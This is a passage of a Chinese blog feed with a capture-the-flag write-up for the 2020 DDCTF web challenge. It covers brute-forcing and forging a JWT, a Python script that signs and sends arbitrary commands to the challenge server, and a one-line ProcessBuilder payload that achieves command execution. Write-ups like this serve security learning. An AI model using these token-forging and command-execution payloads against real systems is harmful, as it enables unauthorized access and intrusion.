      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2020年9月DDCTF题解</title>
    <link href="/2020/09/14/2020%E5%B9%B49%E6%9C%8814%E6%97%A5-DDCTF/"/>
    <url>/2020/09/14/2020%E5%B9%B49%E6%9C%8814%E6%97%A5-DDCTF/</url>
    
    <content type="html"><![CDATA[<p>挺难的（</p><a id="more"></a><h1 id="web：web签到题"><a href="#web：web签到题" class="headerlink" title="web：web签到题"></a>web：web签到题</h1><p>个人觉得挺难的，只做出来一道题，而且这道题需要 pwn 和 web 相结合。</p><h2 id="步骤1：JWT绕过"><a href="#步骤1：JWT绕过" class="headerlink" title="步骤1：JWT绕过"></a>步骤1：JWT绕过</h2><p>图1:题目给定初始条件。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233709.png"></p><p>向 api 发送请求，得到响应如下，data 的数据格式和 jwt 相似，猜测为 jwt 绕过。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;code&quot;</span>: <span class="hljs-number">0</span>,<br><span class="hljs-attr">&quot;message&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>,<br><span class="hljs-attr">&quot;data&quot;</span>: <span class="hljs-string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InN0ciIsInB3ZCI6InN0ciIsInVzZXJSb2xlIjoiR1VFU1QiLCJleHAiOjE1OTkyODY0NzB9.z-i_zjudu5yejiFbCnE9P5NIjOJE61Bzpw75OX1SHmg&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我只做过一次 JWT 绕过的题目，并且当时记笔记的习惯不好，早已忘记。于是先查询了一下 <a href="evernote:///view/24913208/s27/10cd3f6d-645f-475a-a439-8efbdaba360c/10cd3f6d-645f-475a-a439-8efbdaba360c/">JWT 相关原理和基本步骤</a>，初略指导该漏洞可以使用 5 种方式进行攻击。考虑从最简单的暴力破解 key 开始尝试，使用 <a href="https://delcoding.github.io/2018/03/jwt-bypass/">Junay 大佬博客</a>推荐的<a href="https://github.com/brendan-rius/c-jwt-cracker">工具</a>进行尝试，爆破出密码为 str（不同的人密码可能不同），然后到 <a href="https://jwt.io/">https://jwt.io/</a> 进行 jwt 伪造，将伪造后的 jwt 发送到 auth interface 得到 client 下载链接。</p><p>图2:爆破得到的密码<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233726.png"></p><h2 id="步骤2：逆向绕过客户端"><a href="#步骤2：逆向绕过客户端" class="headerlink" title="步骤2：逆向绕过客户端"></a>步骤2：逆向绕过客户端</h2><p>获得 client 后，由队里的其他大佬进行逆向分析，并制作模拟客户端的工具。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> pprint <span class="hljs-keyword">import</span> pprint<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd = input()  <span class="hljs-comment"># 发送的命令</span><br><br>    appkey = <span class="hljs-string">&quot;DDCTFWithYou&quot;</span><br>    time_stamp = str(int(time()))<br>    strToSign = cmd + <span class="hljs-string">&#x27;|&#x27;</span> + time_stamp<br><br>    <span class="hljs-comment"># hmac_sha256加密</span><br>    sha = hmac.new(<br>        bytes(appkey, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        bytes(strToSign, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>),<br>        digestmod=hashlib.sha256<br>    ).digest()<br>    sign = bytes.decode(<br>        b64encode(sha)<br>    )<br><br>    <span class="hljs-comment"># 发起POST请求</span><br>    url = <span class="hljs-string">&quot;http://117.51.136.197/server/command&quot;</span><br>    data = &#123;<br>        <span class="hljs-string">&quot;signature&quot;</span>: sign,<br>        <span class="hljs-string">&quot;command&quot;</span>: cmd,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: time_stamp<br>    &#125;<br>    res = requests.post(<br>        url=url,<br>        data=json.dumps(data)<br>    )<br>    pprint(res.text)<br></code></pre></td></tr></table></figure><h2 id="步骤3：命令执行"><a href="#步骤3：命令执行" class="headerlink" title="步骤3：命令执行"></a>步骤3：命令执行</h2><p>判断后端语言，构造 payload。首先利用语言的运算符测试是否执行，总结存在哪些运算符，然后测试出字符串可以使用 length 函数，猜测可能该语言为「面向对象语言」，从逻辑运算符 != 和 length 函数猜测可能是 <a href="https://coolshell.cn/articles/2631.html">Java 衍生的语言</a>（输入的命令以 # 定义变量，可使用 #a=1 测试）——<a href="http://groovy.codehaus.org/"><strong>Groovy</strong></a>，但是始终无法完美匹配。最终在一篇<a href="https://zhuanlan.kanxue.com/article-12714.htm">博客</a>找到突破点，文章中的很多情景很符合该题目，测试 java.lang.String.class.forName(“java.lang.Runtime”) 时出现 command is evil，断定为 Groovy。于是便开始寻找 Java 命令注入代码，<a href="https://y4er.com/post/java-exec-command/">网上大多数的命令执行</a>大都是使用 Runtime 类或 Processbuider 类，但都是多行代码的形式，<a href="https://github.com/t0kx/exploit-CVE-2015-1427/blob/master/exploit.sh">CVE-2015-1427 的 exploit</a> 也无法执行。网上的命名只有一行为命令执行，我们猜测可以采用乱码方式进行回显，然后在本地解码，然后从 IDEA 自动补全找到 readAllBytes 函数，将数据读出。然后把读出的数据使用 Base64 解码就得到命令执行的结果。</p><p>图3：编程语言分类<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20200913233927.png"></p><p>code：一些关键性的测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span> == true<br><span class="hljs-comment">#a = 1</span><br>&#123;<span class="hljs-number">1</span>&#125;<br><span class="hljs-string">&#x27;abc&#x27;</span>.length()<br><span class="hljs-string">&#x27;abc&#x27;</span>.concat(<span class="hljs-string">&#x27;d&#x27;</span>)<br><span class="hljs-string">&#x27;12 &#x27;</span>.trim()<br><span class="hljs-string">&#x27;1234&#x27;</span>.getBytes()<br><span class="hljs-string">&#x27;hello&#x27;</span>.startsWith(<span class="hljs-string">&#x27;1&#x27;</span>)<br>new ProcessBuilder(<span class="hljs-string">&quot;ls&quot;</span>).start().getInputStream().readAllBytes()<br></code></pre></td></tr></table></figure><p>图4：使用 readAllBytes 读出数据<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/image-20200913234130453.png" alt="image-20200913234130453"></p><p>将读出的数据使用 base64 解开即可。</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>JWT</tag>
      
      <tag>Java命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
